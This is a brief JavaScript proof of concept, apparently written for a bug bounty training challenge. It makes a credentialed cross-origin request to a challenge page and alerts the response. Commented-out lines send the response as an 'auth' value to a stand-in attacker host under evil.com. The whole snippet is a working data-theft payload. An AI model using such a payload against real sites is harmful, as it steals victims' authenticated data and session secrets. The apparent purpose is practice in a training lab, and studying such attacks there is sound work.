var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
    if (this.readyState == 4 && this.status == 200) {
        
        alert(xhttp.responseText);
        //xhttp.open("GET","https://www.bugbountytraining.com.evil.com?auth="+xhttp.responseText,true);
        //xhttp.send()
    }
    
};
xhttp.open("GET","https://www.bugbountytraining.com/challenges/challenge-16.php",true);
xhttp.withCredentials=true;
xhttp.send();